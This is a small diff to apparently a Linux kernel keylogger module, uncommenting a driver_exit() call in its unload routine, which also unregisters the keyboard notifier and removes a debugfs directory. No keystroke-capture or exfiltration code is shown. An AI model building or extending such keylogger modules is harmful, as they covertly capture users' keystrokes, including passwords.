@@ -175,7 +175,7 @@ int run_keylogger(void)
 void stop_keylogger(void)
 {
    unregister_keyboard_notifier(&keylogger);
-    //driver_exit();
+    driver_exit();
     debugfs_remove_recursive(subdir);
     printk(KERN_ALERT "Keylogger: unload the module");
 } 
